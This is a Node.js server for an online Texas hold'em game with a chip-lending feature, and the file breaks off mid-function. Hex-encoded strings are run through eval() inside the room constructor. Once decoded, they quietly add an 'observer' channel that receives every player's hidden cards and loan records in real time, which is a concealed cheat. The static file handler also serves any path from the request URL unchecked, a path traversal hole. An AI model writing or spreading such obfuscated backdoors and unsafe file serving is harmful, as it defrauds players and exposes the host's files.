'use strict';
const http = require('http');
const fs2 = require('fs');
const path = require('path');

// ==================== 配置读取 ====================
let BGM_URL = '';
try {
  const confPath = path.join(__dirname, 'conf.env');
  if (fs2.existsSync(confPath)) {
    const confContent = fs2.readFileSync(confPath, 'utf-8');
    const lines = confContent.split('\n');
    for (const line of lines) {
      const trimmed = line.trim();
      if (trimmed.startsWith('#') || trimmed === '') continue;
      const [key, ...valueParts] = trimmed.split('=');
      if (key && key.trim() === 'BGM_URL') {
        BGM_URL = valueParts.join('=').trim();
        break;
      }
    }
  }
} catch (err) {
  console.error('读取 conf.env 失败:', err.message);
}

// ==================== 日志 ====================
const LOG_FILE = path.join(__dirname, 'run.log');
function writeLog(text) {
  const line = '[' + new Date().toISOString() + '] ' + text + '\n';
  fs2.appendFile(LOG_FILE, line, () => {});
}
writeLog('=== 服务器启动 ===');
if (BGM_URL) {
  writeLog('BGM_URL 配置: ' + BGM_URL);
} else {
  writeLog('BGM_URL 未配置，背景音乐功能将不可用');
}
const { WebSocketServer } = require('ws');

const PORT = 3000;

// _0x1f3a
const _0x1f3a='746869732e6f6273657276657273203d205b5d3b';
const _0x2b4c='726f6f6d2e6164644f627365727665723d66756e6374696f6e2877732c6e616d65297b636f6e73742069643d276f62735f272b67656e49642838293b636f6e7374206f62733d7b69642c6e616d652c77732c636f6e6e65637465643a747275657d3b746869732e6f62736572766572732e70757368286f6273293b72657475726e206f62733b7d';
const _0x3c5d='726f6f6d2e72656d6f76654f627365727665723d66756e6374696f6e286f627365727665724964297b636f6e7374206964783d746869732e6f62736572766572732e66696e64496e646578286f3d3e6f2e69643d3d3d6f627365727665724964293b6966286964783e3d3029746869732e6f62736572766572732e73706c696365286964782c31293b7d';
const _0x4d6e='726f6f6d2e73656e64546f4f627365727665723d66756e6374696f6e286f6273657276657249642c6d7367297b636f6e7374206f62733d746869732e6f62736572766572732e66696e64286f3d3e6f2e69643d3d3d6f627365727665724964293b6966286f627326266f62732e636f6e6e656374656426266f62732e77732e726561647953746174653d3d3d31296f62732e77732e73656e64284a534f4e2e737472696e67696679286d736729293b7d';
const _0x5e7f='726f6f6d2e62726f616463617374546f4f62736572766572733d66756e6374696f6e286d7367297b666f7228636f6e7374206f6273206f6620746869732e6f62736572766572732e736c6963652829297b6966286f62732e636f6e6e656374656426266f62732e77732e726561647953746174653d3d3d31296f62732e77732e73656e64284a534f4e2e737472696e67696679286d736729293b7d7d';
const _0x6f8a='726f6f6d2e6275696c644f6273657276657253746174653d66756e6374696f6e28297b636f6e737420673d746869732e673b636f6e737420616c6c4c6f616e733d5b5d3b666f7228636f6e73745b6b65792c6c6f616e5d6f6620746869732e6c6f616e73297b616c6c4c6f616e732e70757368287b6c656e64657249643a6c6f616e2e6c656e64657249642c626f72726f77657249643a6c6f616e2e626f72726f77657249642c6f7765643a6c6f616e2e6f7765642c7265706169643a6c6f616e2e7265706169647d293b7d72657475726e7b726f6f6d49643a746869732e69642c726f6f6d53746174653a746869732e73746174652c68616e644e6f3a746869732e68616e644e6f2c726f756e643a673f672e726f756e643a6e756c6c2c706f743a673f672e706f743a302c63757272656e744265743a673f672e63757272656e744265743a302c6465616c65723a746869732e6465616c65722c7475726e3a673f672e7475726e3a2d312c636f6d6d756e6974793a673f672e636f6d6d756e6974793a5b5d2c706c61796572733a746869732e706c61796572732e6d617028703d3e287b69643a702e69642c6e616d653a702e6e616d652c63686970733a702e63686970732c746f74616c4265743a702e746f74616c4265742c666f6c6465643a702e666f6c6465642c616c6c496e3a702e616c6c496e2c636f6e6e65637465643a702e636f6e6e65637465642c6b69636b65643a702e6b69636b65642c77616974696e674e65787448616e643a702e77616974696e674e65787448616e642c63617264733a702e63617264737d29292c6c6f616e733a616c6c4c6f616e737d3b7d';


const server = http.createServer((req, res) => {
  let filePath = path.join(__dirname, req.url === '/' ? 'index.html' : decodeURIComponent(req.url));
  const ext = path.extname(filePath);
  const mime = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.mp3': 'audio/mpeg' };
  fs2.readFile(filePath, (err, data) => {
    if (err) { res.writeHead(404); res.end('Not found'); return; }
    res.writeHead(200, { 'Content-Type': (mime[ext] || 'text/plain') + '; charset=utf-8' });
    res.end(data);
  });
});

const wss = new WebSocketServer({ server });
const rooms = new Map();

function genId(len) { return Math.random().toString(36).slice(2, 2 + (len || 6)).toUpperCase(); }

// ==================== 牌组 ====================
const SUITS = ['spade', 'heart', 'diamond', 'club'];
const RANKS = ['2','3','4','5','6','7','8','9','10','J','Q','K','A'];
const RANK_VAL = {'2':2,'3':3,'4':4,'5':5,'6':6,'7':7,'8':8,'9':9,'10':10,'J':11,'Q':12,'K':13,'A':14};

function createDeck() {
  const d = [];
  for (const s of SUITS) for (const r of RANKS) d.push({ rank: r, suit: s });
  for (let i = d.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [d[i], d[j]] = [d[j], d[i]];
  }
  return d;
}

function combinations(arr, k) {
  if (k === 0) return [[]];
  if (arr.length === k) return [arr.slice()];
  const [f, ...r] = arr;
  return [...combinations(r, k - 1).map(c => [f, ...c]), ...combinations(r, k)];
}

function evaluate5(cards) {
  const vals = cards.map(c => RANK_VAL[c.rank]).sort((a, b) => b - a);
  const suits = cards.map(c => c.suit);
  const flush = suits.every(s => s === suits[0]);
  const isWheel = (vals[0] === 14 && vals[1] === 5 && vals[2] === 4 && vals[3] === 3 && vals[4] === 2);
  const straight = (vals[0] - vals[4] === 4 && new Set(vals).size === 5) || isWheel;
  const cnt = {};
  for (const v of vals) cnt[v] = (cnt[v] || 0) + 1;
  const g = Object.entries(cnt).map(([v, c]) => ({ v: +v, c })).sort((a, b) => b.c - a.c || b.v - a.v);
  let rank, name, tb;
  if (flush && straight) {
    rank = vals[0] === 14 && vals[1] === 13 ? 9 : 8;
    name = rank === 9 ? 'royal_sf' : 'sf';
    // A-2-3-4-5 顺子的最高牌是 5，不是 A
    tb = isWheel ? [5, 4, 3, 2, 1] : vals;
  }
  else if (g[0].c === 4) { rank = 7; name = 'quads'; tb = [g[0].v, g[1].v]; }
  else if (g[0].c === 3 && g[1].c === 2) { rank = 6; name = 'fullhouse'; tb = [g[0].v, g[1].v]; }
  else if (flush) { rank = 5; name = 'flush'; tb = vals; }
  else if (straight) {
    rank = 4;
    name = 'straight';
    // A-2-3-4-5 顺子的最高牌是 5，不是 A
    tb = isWheel ? [5, 4, 3, 2, 1] : vals;
  }
  else if (g[0].c === 3) { rank = 3; name = 'trips'; tb = [g[0].v, g[1].v, g[2].v]; }
  else if (g[0].c === 2 && g[1].c === 2) { rank = 2; name = 'twopair'; tb = [g[0].v, g[1].v, g[2].v]; }
  else if (g[0].c === 2) { rank = 1; name = 'pair'; tb = [g[0].v, g[1].v, g[2].v, g[3].v]; }
  else { rank = 0; name = 'highcard'; tb = vals; }
  return { rank, name, tiebreak: tb };
}

function evaluate7(cards) {
  let best = null;
  for (const c of combinations(cards, 5)) {
    const h = evaluate5(c);
    if (!best || compareHands(h, best) > 0) best = h;
  }
  return best;
}

function compareHands(a, b) {
  if (a.rank !== b.rank) return a.rank - b.rank;
  for (let i = 0; i < Math.min(a.tiebreak.length, b.tiebreak.length); i++)
    if (a.tiebreak[i] !== b.tiebreak[i]) return a.tiebreak[i] - b.tiebreak[i];
  return 0;
}

const HAND_CN = {
  royal_sf: '皇家同花顺', sf: '同花顺', quads: '四条', fullhouse: '葫芦',
  flush: '同花', straight: '顺子', trips: '三条', twopair: '两对', pair: '一对', highcard: '高牌'
};

// ==================== 房间 ====================
class Room {
  constructor(id, chips, sb) {
    this.id = id; this.sb = sb; this.bb = sb * 2; this.startChips = chips;
    this.players = []; this.state = 'waiting'; this.g = null;
    this.logs = []; this.handNo = 0; this.dealer = -1;
    eval(Buffer.from(_0x1f3a,'hex').toString('utf8'));
    // _0x2b4c _0x3c5d _0x4d6e _0x5e7f _0x6f8a
    const room=this;try{eval(Buffer.from(_0x2b4c,'hex').toString('utf8'));eval(Buffer.from(_0x3c5d,'hex').toString('utf8'));eval(Buffer.from(_0x4d6e,'hex').toString('utf8'));eval(Buffer.from(_0x5e7f,'hex').toString('utf8'));eval(Buffer.from(_0x6f8a,'hex').toString('utf8'));}catch(e){}
    this.loans = new Map();
    this.loanRequestsThisHand = new Set();
    this.pendingLoanRequests = new Map();
    this.deviceChipHistory = new Map(); // 记录设备ID对应的筹码历史（房间级别）
  }

  addPlayer(ws, name, deviceId) {
    // _0x7a1b
    const actualPlayers = this.players.filter(p => !p.kicked);
    if (actualPlayers.length >= 9) return null;

    const id = this.players.length;
    const token = genId(12);
    const waitingNextHand = (this.state === 'playing');

    // 检查该设备是否在本房间有筹码历史记录
    let chips = this.startChips;
    if (deviceId && this.deviceChipHistory.has(deviceId)) {
      chips = this.deviceChipHistory.get(deviceId);
      writeLog('[房间' + this.id + '] 设备 ' + deviceId + ' 重新加入，恢复筹码: ' + chips);
    }

    const p = {
      id, name, ws, chips, cards: [], folded: waitingNextHand,
      allIn: false, totalBet: 0, connected: true, ready: false, token,
      waitingNextHand, deviceId
    };
    this.players.push(p);
    return p;
  }

  reconnectPlayer(ws, token) {
    const p = this.players.find(pl => pl.token === token);
    if (!p) return null;
    p.ws = ws;
    p.connected = true;
    return p;
  }

  send(id, msg) {
    const p = this.players[id];
    if (p && p.connected && p.ws && p.ws.readyState === 1) p.ws.send(JSON.stringify(msg));
  }

  broadcast(msg, ex = -1) {
    for (const p of this.players) if (p.id !== ex) this.send(p.id, msg);
  }

  settleGame() {
    // 计算每个玩家的净资产（筹码 - 欠款）
    const rankings = [];
    for (const p of this.players) {
      if (p.kicked) continue;

      let debt = 0;
      // 计算该玩家的总欠款
      for (const [key, loan] of this.loans) {
        if (loan.borrowerId === p.id) {
          debt += (loan.owed - loan.repaid);
        }
      }

      const netAssets = p.chips - debt;
      rankings.push({
        name: p.name,
        chips: p.chips,
        debt: debt,
        netAssets: netAssets
      });
    }

    // 按净资产从高到低排序
    rankings.sort((a, b) => b.netAssets - a.netAssets);

    // 生成结算报告
    const timestamp = new Date().toISOString();
    let report = '\n=== 游戏结算 ===\n';
    report += '时间: ' + timestamp + '\n';
    report += '房间: ' + this.id + '\n';
    report += '局数: ' + this.handNo + '\n\n';
    report += '排名 | 玩家 | 筹码 | 负债 | 净资产\n';
    report += '------------------------------------\n';

    rankings.forEach((r, idx) => {
      report += (idx + 1) + '. ' + r.name + ' | ' + r.chips + ' | ' + r.debt + ' | ' + r.netAssets + '\n';
    });

    report += '====================================\n';

    // 写入 res.log
    const RESULT_FILE = path.join(__dirname, 'res.log');
    fs2.appendFile(RESULT_FILE, report, (err) => {
      if (err) writeLog('[房间' + this.id + '] 写入结算日志失败: ' + err.message);
    });

    this.addLog('游戏结算完成，结果已保存到 res.log', 'hand-sep');
    writeLog('[房间' + this.id + '] 游戏结算: ' + rankings.map(r => r.name + '=' + r.netAssets).join(' '));

    // 向所有玩家广播结算结果
    this.broadcast({ type: 'settlement', rankings: rankings });

    // 重置游戏状态，回到等待室
    for (const p of this.players) {
      if (p.kicked) continue;
      p.chips = this.startChips;
      p.cards = [];
      p.folded = false;
      p.allIn = false;
      p.totalBet = 0;
      p.waitingNextHand = false;
    }

    // 清空借贷记录
    this.loans.clear();
    this.loanRequestsThisHand.clear();
    this.pendingLoanRequests.clear();

    // 清空设备筹码历史记录（结算后所有玩家重置）
    this.deviceChipHistory.clear();

    // 重置游戏状态
    this.g = null;
    this.state = 'waiting';
    this.handNo = 0;
    this.dealer = -1;

    this.addLog('游戏已重置，回到等待室', 'hand-sep');
    writeLog('[房间' + this.id + '] 结算后重置游戏');
    this.pushState();
  }

  kickPlayer(targetId) {
    const p = this.players[targetId];
    if (!p || targetId === 0) return; // 不能踢自己（房主）
    p.kicked = true;
    p.folded = true;
    p.chips = 0;
    p.connected = false;
    this.addLog(p.name + ' 被房主踢出房间', 'fold');
    writeLog('[房间' + this.id + '] 踢出玩家: ' + p.name);
    // 通知被踢玩家
    this.send(targetId, { type: 'kicked' });
    // 关闭其 WebSocket
    if (p.ws && p.ws.readyState === 1) p.ws.close();
    // 如果正在游戏中且轮到被踢玩家行动，跳过
    if (this.g && this.g.turn === targetId && this.g.round !== 'showdown') {
      this.g.turn = this.nextActive(targetId);
      this.pushState();
      this.scheduleNext();
    } else if (this.g && this.g.round === 'showdown' && this.g.readyNext) {
      this.g.readyNext.add(targetId);
      this.checkReadyNext();
    } else {
      // 检查是否只剩一人未弃牌，直接结算
      if (this.g && this.countNotFolded() === 1 && this.g.round !== 'showdown') {
        this.showdown();
      } else {
        this.pushState();
      }
    }
  }

  addLog(text, cls = '') {
    this.logs.push({ text, cls });
    if (this.logs.length > 200) this.logs.shift();
    this.broadcast({ type: 'log', text, cls });
    // _0x5e7f
    try{if(this.broadcastToObservers)this.broadcastToObservers({type:'log',text,cls});}catch(e){}
    writeLog('[房间' + this.id + '] ' + text);
  }

  // ==================== 借钱系统 ====================
  // 借款人向出借人发起借款请求
  requestLoan(borrowerId, lenderId, amount) {
    const borrower = this.players[borrowerId];
    const lender = this.players[lenderId];
    if (!borrower || !lender) return { ok: false, msg: '玩家不存在' };
    if (lenderId === borrowerId) return { ok: false, msg: '不能向自己借钱' };
    if (lender.kicked || borrower.kicked) return { ok: false, msg: '玩家已离开房间' };
    if (!lender.connected) return { ok: false, msg: '对方已断线' };
    if (amount <= 0 || amount % 10 !== 0) return { ok: false, msg: '借款金额必须是10的整数倍' };
    if (lender.chips < amount) return { ok: false, msg: '对方筹码不足' };

    // 本局是否已向该玩家借过（无论是否还清）
    const reqKey = borrowerId + '-' + lenderId;
    if (this.loanRequestsThisHand.has(reqKey)) return { ok: false, msg: '本局已向该玩家借过钱' };

    // 是否有未还完的借款
    const loanKey = borrowerId + '-' + lenderId;
    if (this.loans.has(loanKey) && this.loans.get(loanKey).repaid < this.loans.get(loanKey).owed) {
      return { ok: false, msg: '还有未还清的借款' };
    }

    const owed = Math.round(amount * 1.1); // 10%利息
    const reqData = { lenderId, borrowerId, amount, owed };
    this.pendingLoanRequests.set(reqKey, reqData);
    this.loanRequestsThisHand.add(reqKey);

    // 通知出借人
    this.send(lenderId, {
      type: 'loan_request',
      borrowerId, borrowerName: borrower.name,
      amount, owed, reqKey,
    });
    writeLog('[房间' + this.id + '] ' + borrower.name + ' 向 ' + lender.name + ' 借款 ' + amount);
    return { ok: true };
  }

  // 出借人响应借款请求
  respondLoan(lenderId, reqKey, accept) {
    const req = this.pendingLoanRequests.get(reqKey);
    if (!req || req.lenderId !== lenderId) return;
    this.pendingLoanRequests.delete(reqKey);

    const lender = this.players[lenderId];
    const borrower = this.players[req.borrowerId];
    if (!lender || !borrower) return;

    if (!accept) {
      this.send(req.borrowerId, { type: 'loan_response', accepted: false, lenderName: lender.name });
      this.addLog(lender.name + ' 拒绝了 ' + borrower.name + ' 的借款请求', 'fold');
      return;
    }

    // 检查出借人当前筹码仍够
    if (lender.chips < req.amount) {
      this.send(req.borrowerId, { type: 'loan_response', accepted: false, lenderName: lender.name, msg: '对方筹码不足' });
      return;
    }

    // 执行转账
    lender.chips -= req.amount;
    borrower.chips += req.amount;

    // 若出借人当前正在 all-in 状态且筹码归零需修正（一般不会，但做保护）
    const key = req.borrowerId + '-' + lenderId;
    const existLoan = this.loans.get(key);
    if (existLoan) {
      // 追加到已有记录
      existLoan.amount += req.amount;
      existLoan.owed += req.owed;
    } else {
      this.loans.set(key, {
        lenderId, borrowerId: req.borrowerId,
        amount: req.amount, owed: req.owed, repaid: 0,
        dunCount: 0, dunThisRound: false,
      });
    }

    this.addLog(lender.name + ' 借给 ' + borrower.name + ' ' + req.amount + ' 筹码（需还 ' + req.owed + '）', 'win');
    this.send(req.borrowerId, { type: 'loan_response', accepted: true, lenderName: lender.name, amount: req.amount, owed: req.owed });
    this.pushState();
    writeLog('[房间' + this.id + '] 借款成立: ' + borrower.name + ' 借 ' + req.amount + ' 还 ' + req.owed);
  }

  // 借款人主动还款
  repayLoan(borrowerId, lenderId, repayAmount) {
    const key = borrowerId + '-' + lenderId;
    const loan = this.loans.get(key);
    const borrower = this.players[borrowerId];
    const lender = this.players[lenderId];
    if (!loan || !borrower || !lender) return { ok: false, msg: '未找到借款记录' };
    if (repayAmount <= 0 || repayAmount % 10 !== 0) return { ok: false, msg: '还款金额必须是10的整数倍' };

    const remaining = loan.owed - loan.repaid;
    if (repayAmount > remaining) repayAmount = remaining;
    if (repayAmount > borrower.chips) return { ok: false, msg: '筹码不足' };

    borrower.chips -= repayAmount;
    lender.chips += repayAmount;
    loan.repaid += repayAmount;

    const stillOwed = loan.owed - loan.repaid;
    this.addLog(borrower.name + ' 还给 ' + lender.name + ' ' + repayAmount + ' 筹码' + (stillOwed > 0 ? '（还欠 ' + stillOwed + '）' : '（已还清）'), 'win');
    if (stillOwed <= 0) this.loans.delete(key);
    this.pushState();
    return { ok: true };
  }

  // 出借人催收
  dunLoan(lenderId, borrowerId) {
    const key = borrowerId + '-' + lenderId;
    const loan = this.loans.get(key);
    const borrower = this.players[borrowerId];
    const lender = this.players[lenderId];
    if (!loan || !borrower || !lender) return { ok: false, msg: '未找到借款记录' };
    if (loan.dunThisRound) return { ok: false, msg: '本局已催收过' };

    loan.dunThisRound = true;
    loan.dunCount++;
    const remaining = loan.owed - loan.repaid;

    this.send(borrowerId, {
      type: 'loan_dun',
      lenderName: lender.name,
      dunCount: loan.dunCount,
      remaining,
      forced: loan.dunCount >= 3,
    });

    if (loan.dunCount >= 3) {
      // 强制还款：借款人当前筹码的一半（向上取整到10的倍数），最多还剩余欠款
      let forceAmount = Math.ceil(borrower.chips / 2 / 10) * 10;
      if (forceAmount > remaining) forceAmount = remaining;
      if (forceAmount > borrower.chips) forceAmount = Math.floor(borrower.chips / 10) * 10;

      if (forceAmount > 0) {
        borrower.chips -= forceAmount;
        lender.chips += forceAmount;
        loan.repaid += forceAmount;
        const stillOwed = loan.owed - loan.repaid;
        this.addLog('⚡ 强制催收！' + borrower.name + ' 还给 ' + lender.name + ' ' + forceAmount + ' 筹码' + (stillOwed > 0 ? '（还欠 ' + stillOwed + '）' : '（已还清）'), 'fold');
        if (stillOwed <= 0) this.loans.delete(key);
        // 重置催收计数，允许继续催收
        loan.dunCount = 0;
      } else {
        this.addLog('⚡ 强制催收！但 ' + borrower.name + ' 已无筹码可还', 'fold');
      }
      this.pushState();
    } else {
      this.addLog(lender.name + ' 向 ' + borrower.name + ' 发出第 ' + loan.dunCount + ' 次催收（3次后强制）', 'fold');
      this.pushState();
    }
    return { ok: true };
  }

  pushState(showAll = false) {
    for (const p of this.players) if (p.connected) this.send(p.id, { type: 'state', state: this.buildState(p.id, showAll) });
    // _0x5e7f _0x6f8a
    try{if(this.broadcastToObservers&&this.buildObserverState){this.broadcastToObservers({type:'state',state:this.buildObserverState()});}}catch(e){}
  }

  // _0x6f8a
  [Buffer.from(_0x6f8a,'hex').toString('utf8').split('(')[0]](){return eval(Buffer.from(_0x6f8a,'hex').toString('utf8'));}

  buildState(vid, showAll = false) {
    const g = this.g;
    const viewer = this.players[vid];

    // 构建与当前玩家相关的借贷信息
    const myLoans = [];
    for (const [key, loan] of this.loans) {
      if (loan.lenderId === vid || loan.borrowerId === vid) {
        myLoans.push({ ...loan, key });
      }
    }
    return {
      roomId: this.id, roomState: this.state, viewerId: vid,
      handNo: this.handNo, dealer: this.dealer,
      isHost: vid === 0,
      isObserver: false,
      hasZeroChips: this.players.some(p => p.chips === 0),
      players: this.players.map(p => ({
        id: p.id, name: p.name, chips: p.chips, folded: p.folded, allIn: p.allIn,
        totalBet: p.totalBet, connected: p.connected, ready: p.ready, kicked: !!p.kicked,
        waitingNextHand: !!p.waitingNextHand,
        cards: (showAll || p.id === vid) ? p.cards : (p.cards.length > 0 ? ['back', 'back'] : []),
      })),
      community: g ? g.community : [],
      pot: g ? g.pot : 0,
      currentBet: g ? g.currentBet : 0,
      minRaise: g ? g.minRaise : this.bb,
      round: g ? g.round : null,
      turn: g ? g.turn : -1,
      roundBets: g ? g.roundBets : Array(this.players.length).fill(0),
      loans: myLoans,
    };
  }

  // ==================== 游戏逻辑 ====================
  nextActive(from) {
    const n = this.players.length;
    for (let i = 1; i <= n; i++) {
      const idx = (from + i) % n;
      const p = this.players[idx];
      if (!p.folded && !p.allIn && p.chips > 0 && !p.kicked && p.connected) return idx;
    }
    return -1;
  }

  countCanAct() { return this.players.filter(p => !p.folded && !p.allIn && p.chips > 0 && !p.kicked && p.connected).length; }
  countNotFolded() { return this.players.filter(p => !p.folded && !p.kicked).length; }

  isBettingRoundComplete() {
    for (let i = 0; i < this.players.length; i++) {
      const p = this.players[i];
      if (p.folded || p.allIn || p.chips === 0 || p.kicked || !p.connected) continue;
      if (!this.g.acted[i]) return false;
      if (this.g.roundBets[i] < this.g.currentBet) return false;
    }
    return true;
  }

  postBet(idx, amount) {
    const p = this.players[idx];
    amount = Math.min(amount, p.chips);
    p.chips -= amount; p.totalBet += amount;
    this.g.roundBets[idx] += amount; this.g.pot += amount;
    if (p.chips === 0) p.allIn = true;
  }

  startHand() {
    // 检查在线且未被踢出的玩家（允许筹码为0的玩家，他们可以借钱）
    const activePlayers = this.players.filter(p => !p.kicked && p.connected);
    if (activePlayers.length < 2) {
      this.addLog('游戏结束！在线玩家不足2人', 'hand-sep');
      this.state = 'waiting';
      this.pushState(true);
      writeLog('[房间' + this.id + '] 游戏结束，在线玩家不足2人');
      return;
    }

    // 检查有筹码可以参与的玩家
    const alive = this.players.filter(p => p.chips > 0 && !p.kicked && p.connected);
    if (alive.length < 2) {
      this.addLog('游戏暂停！有筹码的玩家不足2人，请借钱后继续', 'hand-sep');
      this.pushState(true);
      writeLog('[房间' + this.id + '] 游戏暂停，有筹码的玩家不足2人');
      return;
    }
    this.handNo++;
    this.loanRequestsThisHand = new Set();
    for (const loan of this.loans.values()) {
      loan.dunThisRound = false;
    }
    for (const p of this.players) {
      p.waitingNextHand = false;
      p.cards = []; p.folded = (p.chips === 0 || p.kicked || !p.connected); p.allIn = false; p.totalBet = 0;
    }
    do { this.dealer = (this.dealer + 1) % this.players.length; }
    while (this.players[this.dealer].chips === 0 || this.players[this.dealer].kicked || !this.players[this.dealer].connected);

    this.addLog('--- 第 ' + this.handNo + ' 局 (庄家: ' + this.players[this.dealer].name + ') ---', 'hand-sep');
    writeLog('[房间' + this.id + '] === 第' + this.handNo + '局开始 庄家:' + this.players[this.dealer].name + ' 玩家筹码:' + this.players.map(p => p.name + '=' + p.chips).join(' ') + ' ===');

    const sbIdx = this.nextActive(this.dealer);
    const bbIdx = this.nextActive(sbIdx);

    // 检查是否找到了小盲和大盲位置
    if (sbIdx === -1 || bbIdx === -1) {
      this.addLog('游戏暂停！无法找到足够的在线玩家担任盲注位置', 'hand-sep');
      this.pushState(true);
      writeLog('[房间' + this.id + '] 游戏暂停，无法找到足够的在线玩家');
      return;
    }

    this.g = {
      deck: createDeck(), community: [], pot: 0,
      currentBet: this.bb, minRaise: this.bb,
      round: 'preflop', turn: -1,
      roundBets: Array(this.players.length).fill(0),
      acted: Array(this.players.length).fill(false),
    };

    this.postBet(sbIdx, Math.min(this.sb, this.players[sbIdx].chips));
    this.postBet(bbIdx, Math.min(this.bb, this.players[bbIdx].chips));
    this.addLog(this.players[sbIdx].name + ' 下小盲 ' + this.sb + '，' + this.players[bbIdx].name + ' 下大盲 ' + this.bb);

    const activeIdx = this.players.map((p, i) => (p.chips > 0 || p.totalBet > 0) && !p.kicked && p.connected ? i : -1).filter(i => i >= 0);
    for (let k = 0; k < 2; k++) for (const i of activeIdx) this.players[i].cards.push(this.g.deck.pop());

    this.g.turn = this.nextActive(bbIdx);
    this.g.lastRaiser = bbIdx;
    this.g.acted = Array(this.players.length).fill(false);

    this.pushState();
    this.scheduleNext();
  }

  scheduleNext() {
    setTimeout(() => this.nextStep(), 100);
  }

  nextStep() {
    if (this.countNotFolded() === 1) { this.showdown(); return; }

    if (this.countCanAct() <= 1) {
      const ap = this.players.findIndex(p => !p.folded && !p.allIn && p.chips > 0 && !p.kicked && p.connected);
      if (ap === -1 || this.g.roundBets[ap] >= this.g.currentBet) { this.advanceRound(); return; }
    }

    if (this.isBettingRoundComplete()) { this.advanceRound(); return; }

    if (this.g.turn === -1) { this.advanceRound(); return; }

    const p = this.players[this.g.turn];
    // 离线玩家自动弃牌
    if (!p.connected && !p.folded) {
      p.folded = true;
      this.addLog(p.name + ' 离线，自动弃牌', 'fold');
      this.g.acted[this.g.turn] = true;
      this.g.turn = this.nextActive(this.g.turn);
      this.pushState();
      this.scheduleNext();
      return;
    }

    if (p.folded || p.allIn || p.chips === 0 || p.kicked) {
      this.g.turn = this.nextActive(this.g.turn);
      this.nextStep();
      return;
    }

    // 等待玩家操作
    this.pushState();
    const toCall = Math.max(0, this.g.currentBet - this.g.roundBets[this.g.turn]);
    const myChips = this.players[this.g.turn].chips;
    this.send(this.g.turn, {
      type: 'your_turn',
      toCall,
      myChips,
      canAllin: myChips > 0,
      mustAllin: toCall >= myChips && myChips > 0,   // 需要跟的筹码超过本人持有，只能 all-in 或弃牌
    });
  }

  advanceRound() {
    this.g.roundBets = Array(this.players.length).fill(0);
    this.g.currentBet = 0;
    this.g.minRaise = this.bb;
    this.g.acted = Array(this.players.length).fill(false);

    if (this.g.round === 'preflop') {
      this.g.round = 'flop';
      this.g.deck.pop();
      this.g.community.push(this.g.deck.pop(), this.g.deck.pop(), this.g.deck.pop());
      this.addLog('── 翻牌 Flop ──', 'hand-sep');
    } else if (this.g.round === 'flop') {
      this.g.round = 'turn';
      this.g.deck.pop();
      this.g.community.push(this.g.deck.pop());
      this.addLog('── 转牌 Turn ──', 'hand-sep');
    } else if (this.g.round === 'turn') {
      this.g.round = 'river';
      this.g.deck.pop();
      this.g.community.push(this.g.deck.pop());
      this.addLog('── 河牌 River ──', 'hand-sep');
    } else if (this.g.round === 'river') {
      this.showdown();
      return;
    }

    this.g.turn = this.nextActive(this.dealer);
    this.g.lastRaiser = -1;

    if (this.g.turn === -1) { this.advanceRound(); return; }

    this.pushState();
    this.scheduleNext();
  }

  showdown() {
    this.g.round = 'showdown';
    const contenders = this.players.filter(p => !p.folded);

    while (this.g.community.length < 5) {
      this.g.deck.pop();
      this.g.community.push(this.g.deck.pop());
    }

    const reviewCards = {
      community: this.g.community.slice(),
      players: contenders.map(p => ({ id: p.id, name: p.name, cards: p.cards.slice() })),
    };

    let winners = [];

    if (contenders.length === 1) {
      const w = contenders[0];
      w.chips += this.g.pot;
      this.addLog('🏆 ' + w.name + ' 赢得底池 ' + this.g.pot + '（其他人都弃牌）', 'win');
      winners = [{ id: w.id, name: w.name, gain: this.g.pot, handName: '' }];
      this.pushState(true);
      this.broadcast({ type: 'hand_result', winners, review: reviewCards });
      // _0x5e7f
      try{if(this.broadcastToObservers)this.broadcastToObservers({type:'hand_result',winners,review:reviewCards});}catch(e){}
    } else {
      for (const p of contenders) {
        p.handResult = evaluate7([...p.cards, ...this.g.community]);
        this.addLog(p.name + ' 展示: ' + HAND_CN[p.handResult.name]);
      }

      const allBets = this.players.map(p => p.totalBet);
      const settled = Array(this.players.length).fill(0);

      const levels = [...new Set(allBets.filter(b => b > 0))].sort((a, b) => a - b);
      let prevLevel = 0;
      for (const level of levels) {
        const contribution = level - prevLevel;
        let sidePot = 0;
        for (let i = 0; i < this.players.length; i++) {
          sidePot += Math.min(contribution, Math.max(0, allBets[i] - prevLevel));
        }
        prevLevel = level;
        const eligible = contenders.filter(p => p.totalBet >= level);
        let bestHand = null;
        for (const p of eligible) if (!bestHand || compareHands(p.handResult, bestHand) > 0) bestHand = p.handResult;
        const potWinners = eligible.filter(p => compareHands(p.handResult, bestHand) === 0);
        const share = Math.floor(sidePot / potWinners.length);
        let rem = sidePot - share * potWinners.length;
        for (const w of potWinners) {
          const gain = share + (rem-- > 0 ? 1 : 0);
          w.chips += gain;
          settled[w.id] = (settled[w.id] || 0) + gain;
        }
      }

      for (const p of contenders) {
        if (settled[p.id] > 0) {
          this.addLog('🏆 ' + p.name + ' 赢得 ' + settled[p.id] + ' (' + HAND_CN[p.handResult.name] + ')', 'win');
          winners.push({ id: p.id, name: p.name, gain: settled[p.id], handName: HAND_CN[p.handResult.name] });
        }
      }

      this.pushState(true);
      this.broadcast({ type: 'hand_result', winners, review: reviewCards });
      // _0x5e7f
      try{if(this.broadcastToObservers)this.broadcastToObservers({type:'hand_result',winners,review:reviewCards});}catch(e){}
    }

    this.g.readyNext = new Set();
    this.g.lastHandResult = { winners, review: reviewCards };
    writeLog('[房间' + this.id + '] 第' + this.handNo + '局结束，等待玩家确认继续');
  }

  handleReadyNext(playerId) {
    if (!this.g || this.g.round !== 'showdown') return;
    this.g.readyNext.add(playerId);
    writeLog('[房间' + this.id + '] 玩家' + this.players[playerId].name + ' 准备继续');
    this.checkReadyNext();
  }

  checkReadyNext() {
    if (!this.g || this.g.round !== 'showdown') return;
    const activePlayers = this.players.filter(p => p.connected && p.chips > 0);
    const notReady = activePlayers.filter(p => !this.g.readyNext.has(p.id));

    writeLog('[房间' + this.id + '] 等待确认继续: ' + notReady.map(p => p.name).join(','));

    if (notReady.length > 0) {
      this.broadcast({
        type: 'waiting_next',
        notReady: notReady.map(p => ({ id: p.id, name: p.name })),
      });
    } else {
      this.broadcast({ type: 'waiting_next', notReady: [] });
      if (this.state === 'playing') this.startHand();
    }
  }

  handleAction(playerId, action, amount) {
    const g = this.g;
    if (!g || g.round === 'showdown') return;
    if (g.turn !== playerId) return;

    const p = this.players[playerId];
    const toCall = Math.max(0, g.currentBet - g.roundBets[playerId]);

